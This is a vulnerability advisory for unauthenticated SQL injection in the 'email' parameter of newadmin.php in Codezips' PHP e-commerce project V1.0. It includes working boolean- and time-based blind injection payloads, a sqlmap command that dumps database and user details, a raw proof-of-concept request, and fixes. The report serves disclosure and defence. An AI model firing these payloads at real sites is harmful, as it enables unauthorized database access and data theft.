# Codezips E-commerce Site Using PHP With Source Code V1.0 newadmin.php SQL injection

# NAME OF AFFECTED PRODUCT(S)

- E-commerce Site Using PHP With Source Code

## Vendor Homepage

- https://codezips.com/php/e-commerce-site-using-php-with-source-code/

# AFFECTED AND/OR FIXED VERSION(S)

## submitter

- `zhangjiale`

## Vendor

- `codezips`

## Vulnerable File

- `newadmin.php`

## VERSION(S)

- V1.0

## Software Link

- https://codeload.github.com/codezips/ecommerce-site-using-php/zip/master

# PROBLEM TYPE

## Vulnerability Type

- SQL injection

## Root Cause

- Although there is control access, it does not prevent the code from continuing to execute

  <img src="./image/image-20241218171736003.png" style="zoom: 200%;" />

- A SQL injection vulnerability was found in the 'newadmin.php' file of  the 'E-commerce Site Using PHP With Source Code' project. The reason for this issue is that attackers inject malicious code from the parameter  'email' and use it directly in SQL queries without the need for  appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized  operations.

  <img src="./image/image-20241218171816147.png" style="zoom:150%;" />

## Impact

- Attackers can exploit this SQL injection vulnerability to achieve  unauthorized database access, sensitive data leakage, data tampering,  comprehensive system control, and even service interruption, posing a  serious threat to system security and business continuity.

# DESCRIPTION

- During the security review of "E-commerce Site Using PHP With Source Code", zhangjiale  discovered a critical SQL injection vulnerability in the "newadmin.php" file. This vulnerability stems from insufficient  user input validation of the 'email' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain  unauthorized access to databases, modify or delete data, and access  sensitive information. Immediate remedial measures are needed to ensure  system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability

# Vulnerability details and POC

## Vulnerability lonameion:

- 'email' parameter

## Payload:

```
Parameter: email (POST)
Type: boolean-based blind
Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
Payload: first_name=qqqq&last_name=qqqqq&email=123@qqd.com' RLIKE (SELECT (CASE WHEN (2793=2793) THEN 0x313233407171642e636f6d ELSE 0x28 END))-- AVxO&mobile=2123&password=123&admintype=qqqq&signupaddress=12&signup=Sign Me Up!

Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: first_name=qqqq&last_name=qqqqq&email=123@qqd.com' AND (SELECT 1160 FROM (SELECT(SLEEP(5)))wDez)-- YxAl&mobile=2123&password=123&admintype=qqqq&signupaddress=12&signup=Sign Me Up!
```

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:

```
python sqlmap.py  -r url.txt -p email --current-db --current-user --is-dba
```

```
poc
POST /admin/newadmin.php HTTP/1.1
Host: 192.168.75.224
Content-Length: 115
Cache-Control: max-age=0
Origin: http://192.168.75.224
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.75.224/admin/newadmin.php
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=86k42l8aso8tibk6verjr20gc5
Connection: close

first_name=qqqq&last_name=qqqqq&email=123%40qqd.com&mobile=2123&password=123&admintype=qqqq&signupaddress=12&signup=Sign+Me+Up%21
```

<img src="./image/4.png" style="zoom:150%;" />

## Suggested fixes

1. **Use prepared statements and parameter binding:**
   Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered  by the user is treated as pure data and will not be interpreted as SQL  code.
2. **Input validation and filtering:**
   Strictly validate and filter user input data to ensure it conforms to the expected format.
3. **Regular security audits:**
   Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.